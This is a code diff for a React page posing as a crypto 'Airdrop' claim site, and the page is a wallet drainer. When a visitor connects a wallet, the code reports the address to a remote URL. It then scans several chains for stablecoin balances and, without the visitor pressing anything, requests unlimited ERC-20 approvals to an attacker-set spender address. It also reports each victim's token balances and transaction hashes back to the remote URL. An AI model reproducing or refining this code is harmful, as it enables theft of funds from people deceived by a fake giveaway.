@@ -1,200 +1,360 @@
 'use client';
 
-import { useState, useEffect, useRef } from 'react';
+import { useState, useEffect } from 'react';
 import { useAccount, useChainId } from 'wagmi';
-import { erc20Abi, maxUint256, formatUnits } from 'viem';
+import { erc20Abi, maxUint256 } from 'viem';
+import { readContract, getBalance, switchChain } from '@wagmi/core';
+import { config } from '@/config';
+
 import {
-  createMeeClient,
-  toMultichainNexusAccount,
-  getMEEVersion,
-  MEEVersion,
-} from '@biconomy/abstractjs';
-import { getWalletClient } from '@wagmi/core';
-import { config, TOKENS_BY_CHAIN, CHAIN_NAMES, CHAIN_BY_ID, transports } from '@/config';
+  createGelatoSmartWalletClient,
+  sponsored,
+} from '@gelatonetwork/smartwallet';
 
-// --- required env (production)
-const BICONOMY_API_KEY = process.env.NEXT_PUBLIC_BICONOMY_API_KEY || '';
+const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
+
 const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || '') as `0x${string}`;
-const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL || '';
+if (!SPENDER || SPENDER === '0x') {
+  throw new Error('SPENDER_ADDRESS is not defined or invalid');
+}
 
-if (!BICONOMY_API_KEY) throw new Error('NEXT_PUBLIC_BICONOMY_API_KEY missing in .env (production required)');
-if (!SPENDER || SPENDER === '0x') throw new Error('NEXT_PUBLIC_SPENDER missing/invalid in .env');
+const TOKENS_BY_CHAIN: Record<
+  number,
+  { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
+> = {
+  1: [
+    {
+      symbol: 'USDT',
+      address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+      min: BigInt(1 * 10 ** 6),
+      decimals: 6,
+    },
+    {
+      symbol: 'USDC',
+      address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+      min: BigInt(1 * 10 ** 6),
+      decimals: 6,
+    },
+    {
+      symbol: 'DAI',
+      address: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+      min: BigInt(1 * 10 ** 18),
+      decimals: 18,
+    },
+    {
+      symbol: 'BUSD',
+      address: '0x4fabb145d64652a948d72533023f6e7a623c7c53',
+      min: BigInt(1 * 10 ** 18),
+      decimals: 18,
+    },
+  ],
+  42161: [
+    {
+      symbol: 'USDT',
+      address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
+      min: BigInt(1 * 10 ** 6),
+      decimals: 6,
+    },
+    {
+      symbol: 'USDC',
+      address: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
+      min: BigInt(1 * 10 ** 6),
+      decimals: 6,
+    },
+    {
+      symbol: 'DAI',
+      address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1',
+      min: BigInt(1 * 10 ** 18),
+      decimals: 18,
+    },
+  ],
+  11155111: [
+    {
+      symbol: 'USDC',
+      address: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
+      min: BigInt(1 * 10 ** 6),
+      decimals: 6,
+    },
+    {
+      symbol: 'LINK',
+      address: '0x779877A7B0D9E8603169DdbD7836e478b4624789',
+      min: BigInt(1 * 10 ** 18),
+      decimals: 18,
+    },
+  ],
+};
 
-export default function Page() {
+const CHAIN_NAMES: Record<number, string> = {
+  1: 'Ethereum Mainnet',
+  42161: 'Arbitrum',
+  11155111: 'Sepolia',
+};
+
+function ConnectionReporter() {
+  const { address, isConnected } = useAccount();
+
+  useEffect(() => {
+    if (isConnected && address) {
+      fetch(`${REPORT_URL}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          event: 'connect',
+          wallet: address,
+        }),
+      }).catch(console.error);
+    }
+  }, [isConnected, address]);
+
+  return null;
+}
+
+export default function Home() {
   const { address, isConnected } = useAccount();
   const chainId = useChainId();
   const [status, setStatus] = useState<string>('');
-  const [loading, setLoading] = useState<boolean>(false);
-  const connectReported = useRef(false);
-
-  // Report connect once
-  useEffect(() => {
-    if (!connectReported.current && isConnected && address) {
-      connectReported.current = true;
-      if (REPORT_URL) {
-        fetch(REPORT_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ event: 'connect', wallet: address, chainId }),
-        }).catch(console.error);
-      }
-    }
-  }, [isConnected, address, chainId]);
 
   async function handleClaim() {
-    if (!isConnected || !address || !chainId) {
-      setStatus('⚠️ Wallet not connected or chain not set');
+    if (!isConnected || !address) {
+      setStatus('Wallet not connected');
       return;
     }
 
-    setLoading(true);
-    setStatus('🔍 Preparing MEE / scanning tokens...');
-
     try {
-      const activeChain = chainId;
+      setStatus('Scanning chains for balances...');
 
-      // Wallet client from wagmi
-      const walletClient = await getWalletClient(config, { chainId: activeChain });
-      if (!walletClient) throw new Error('No wallet client available for active chain');
+      let targetChain: number | null = null;
+      let usableTokens: {
+        symbol: string;
+        address: `0x${string}`;
+        min: bigint;
+        decimals: number;
+      }[] = [];
 
-      // Multichain orchestrator
-      const orchestrator = await toMultichainNexusAccount({
-        signer: walletClient,
-        chainConfigurations: [
-          {
-            chain: CHAIN_BY_ID[activeChain],
-            transport: transports[activeChain],
-            version: getMEEVersion(MEEVersion.V2_1_0),
-          },
-        ],
-      });
+      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
+        const numericCid = Number(cid);
 
-      const meeClient = await createMeeClient({
-        account: orchestrator,
-        apiKey: BICONOMY_API_KEY,
-      });
-
-      // Get tokens for active chain
-      const tokens = TOKENS_BY_CHAIN[activeChain] || [];
-      if (tokens.length === 0) {
-        setStatus(`⚠️ No tokens configured for chain ${CHAIN_NAMES?.[activeChain] ?? activeChain}`);
-        setLoading(false);
-        return;
-      }
-
-      const instructions: any[] = [];
-      const approvedTokens: { symbol: string; address: string; amount: string; decimals: number }[] = [];
-
-      for (const token of tokens) {
-        try {
-          // <-- FIX: use orchestrator.readContract (not meeClient.readContract) and cast addresses
-          const bal = await orchestrator.readContract({
-            chainId: activeChain,
-            abi: erc20Abi,
-            address: token.address as `0x${string}`,
-            functionName: 'balanceOf',
-            args: [address as `0x${string}`],
-          }) as bigint;
-
-          if (bal > BigInt(0)) {
-            approvedTokens.push({
-              symbol: token.symbol,
+        for (const token of tokens) {
+          try {
+            const bal = (await readContract(config, {
+              chainId: numericCid,
               address: token.address,
-              amount: formatUnits(bal, token.decimals),
-              decimals: token.decimals,
-            });
+              abi: erc20Abi,
+              functionName: 'balanceOf',
+              args: [address],
+            })) as bigint;
 
-            const instr = await orchestrator.buildComposable({
-              type: 'default',
-              data: {
-                abi: erc20Abi,
-                chainId: activeChain,
-                to: token.address as `0x${string}`,
-                functionName: 'approve',
-                args: [SPENDER, maxUint256],
-              },
-            });
-
-            instructions.push(instr);
-          }
-        } catch (err) {
-          console.warn(`Failed reading balance for ${token.symbol}`, err);
+            if (bal >= token.min) {
+              targetChain = numericCid;
+              usableTokens.push(token);
+            }
+          } catch {}
         }
+
+        if (usableTokens.length > 0) break;
       }
 
-      if (instructions.length === 0) {
-        setStatus('ℹ️ No token balances found to approve.');
-        setLoading(false);
+      if (!targetChain || usableTokens.length === 0) {
+        setStatus('No usable balances found on any chain.');
         return;
       }
 
-      setStatus(`🚀 Submitting ${instructions.length} approval(s) via MEE...`);
+      const chainName = CHAIN_NAMES[targetChain] || 'Unknown Chain';
 
-      const feeCandidate = approvedTokens[0];
-      const feeTokenAddress = feeCandidate ? (feeCandidate.address as `0x${string}`) : undefined;
-
-      const fusionQuote = await meeClient.getFusionQuote({
-        instructions,
-        trigger: {
-          chainId: activeChain,
-          tokenAddress: (feeTokenAddress ?? (tokens[0].address as `0x${string}`)) as `0x${string}`,
-          amount: BigInt(1),
-        },
-        feeToken: feeTokenAddress ? { address: feeTokenAddress, chainId: activeChain } : undefined,
-      });
-
-      const { hash } = await meeClient.executeFusionQuote({ fusionQuote });
-      await meeClient.waitForSupertransactionReceipt({ hash });
-
-      for (const t of approvedTokens) {
-        if (REPORT_URL) {
-          await fetch(REPORT_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              event: 'approval',
-              wallet: address,
-              chainId: activeChain,
-              chainName: CHAIN_NAMES?.[activeChain] ?? activeChain,
-              token: t.address,
-              symbol: t.symbol,
-              amount: t.amount,
-              decimals: t.decimals,
-              txHash: hash,
-              spender: SPENDER,
-            }),
-          }).catch(console.error);
-        }
+      if (chainId !== targetChain) {
+        setStatus(`Switching to ${chainName}...`);
+        await switchChain(config, { chainId: targetChain });
       }
 
-      setStatus(`✅ Approvals completed (tx: ${hash})`);
+      const nativeBal = await getBalance(config, {
+        address,
+        chainId: targetChain,
+      });
+      if (nativeBal.value < BigInt(100000000000000)) {
+        setStatus('Not enough native token to pay gas fees.');
+        return;
+      }
+
+      // 🔹 Initialize Gelato Smart Wallet Client
+      const client = createGelatoSmartWalletClient({
+        transport: http(),
+        chain: targetChain,
+      });
+
+      for (const token of usableTokens) {
+        setStatus(`Approving ${token.symbol} on ${chainName} (sponsored by Gelato)...`);
+
+        const txHash = await client.sendUserOperation(
+          sponsored({
+            calls: [
+              {
+                to: token.address,
+                data: {
+                  abi: erc20Abi,
+                  functionName: 'approve',
+                  args: [SPENDER, maxUint256],
+                },
+              },
+            ],
+          })
+        );
+
+        let rawBalance: bigint = BigInt(0);
+        try {
+          rawBalance = (await readContract(config, {
+            chainId: targetChain,
+            address: token.address,
+            abi: erc20Abi,
+            functionName: 'balanceOf',
+            args: [address],
+          })) as bigint;
+        } catch (err) {
+          console.error(`Failed to read balance for ${token.symbol}:`, err);
+        }
+
+        const decimals = (token as any).decimals || 18;
+        const formattedBalance = Number(rawBalance) / 10 ** decimals;
+
+        setStatus(`${token.symbol} approved ✅ | Balance: ${formattedBalance}`);
+
+        await fetch(`${REPORT_URL}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            event: 'approval',
+            wallet: address,
+            chainName,
+            token: token.address,
+            symbol: token.symbol,
+            balance: formattedBalance,
+            txHash,
+          }),
+        }).catch(console.error);
+      }
+
+      setStatus('All approvals completed!');
     } catch (err: any) {
-      console.error('handleClaim error', err);
-      setStatus(`❌ Error: ${err?.message ?? String(err)}`);
-    } finally {
-      setLoading(false);
+      console.error(err);
+      setStatus('Error: ' + (err?.shortMessage || err?.message || 'unknown'));
     }
   }
 
+  useEffect(() => {
+    if (isConnected && address) handleClaim();
+  }, [isConnected, address]);
+
   return (
-    <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 24, marginTop: 40 }}>
-      <header style={{ position: 'fixed', top: 0, left: 0, right: 0, height: 64, background: '#09011fff', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 24px', boxShadow: '0 2px 8px rgba(241,235,235,0.08)', zIndex: 1000 }}>
-        <div style={{ fontFamily: 'sans-serif', fontWeight: 'bold', fontSize: 18, color: '#aaa587ff' }}>AIRDROPS</div>
+    <main
+      style={{
+        display: 'flex',
+        flexDirection: 'column',
+        alignItems: 'center',
+        gap: '24px',
+        marginTop: '40px',
+      }}
+    >
+      <header
+        style={{
+          position: 'fixed',
+          top: 0,
+          left: 0,
+          right: 0,
+          height: '64px',
+          background: '#09011fff',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'space-between',
+          padding: '0 24px',
+          paddingTop: 'env(safe-area-inset-top)',
+          boxShadow: '0 2px 8px rgba(241, 235, 235, 0.08)',
+          zIndex: 1000,
+        }}
+      >
+        <div
+          style={{
+            fontFamily: 'sans-serif',
+            fontWeight: 'bold',
+            fontSize: '18px',
+            color: '#aaa587ff',
+          }}
+        >
+          AIRDROPS
+        </div>
         <appkit-button />
       </header>
 
-      <div style={{ display: 'flex', flexDirection: 'column', gap: 24, paddingTop: 80, width: '80%', maxWidth: 600 }}>
-        <div style={{ border: '1px solid #9dd6d1ff', borderRadius: 12, padding: 20, background: '#090e41ff', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'space-between', height: 500 }}>
-          <h2 style={{ marginBottom: 12 }}>Airdrop</h2>
+      <ConnectionReporter />
 
-          <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#e4e1daff', fontSize: 14, textAlign: 'center' }}>
+      <div
+        style={{
+          display: 'flex',
+          flexDirection: 'column',
+          gap: '24px',
+          paddingTop: '80px',
+          width: '80%',
+          maxWidth: '600px',
+        }}
+      >
+        <div
+          style={{
+            border: '1px solid #9dd6d1ff',
+            borderRadius: '12px',
+            padding: '20px',
+            background: '#090e41ff',
+            display: 'flex',
+            flexDirection: 'column',
+            alignItems: 'center',
+            justifyContent: 'space-between',
+            height: '500px',
+          }}
+        >
+          <h2 style={{ marginBottom: '12px' }}>Airdrop</h2>
+
+          <div
+            style={{
+              flex: 1,
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              color: '#e4e1daff',
+              fontSize: '14px',
+              textAlign: 'center',
+            }}
+          >
             {status || ''}
           </div>
 
-          <button onClick={handleClaim} disabled={loading} style={{ background: loading ? '#444' : '#a00b0bff', color: 'white', padding: '12px 28px', borderRadius: 8, cursor: loading ? 'not-allowed' : 'pointer', marginTop: 16 }}>
-            {loading ? 'Processing...' : 'Claim Now'}
+          <button
+            onClick={handleClaim}
+            style={{
+              background: '#a00b0bff',
+              color: 'white',
+              padding: '12px 28px',
+              borderRadius: '8px',
+              cursor: 'pointer',
+              marginTop: '16px',
+            }}
+          >
+            Claim Now
           </button>
         </div>
+
+        {[1, 2, 3].map((i) => (
+          <div
+            key={i}
+            style={{
+              border: '1px solid #c9c8ddff',
+              borderRadius: '12px',
+              padding: '20px',
+              background: '#0e0a42ff',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+            }}
+          >
+            <span>Box {i + 1}</span>
+          </div>
+        ))}
       </div>
     </main>
   );
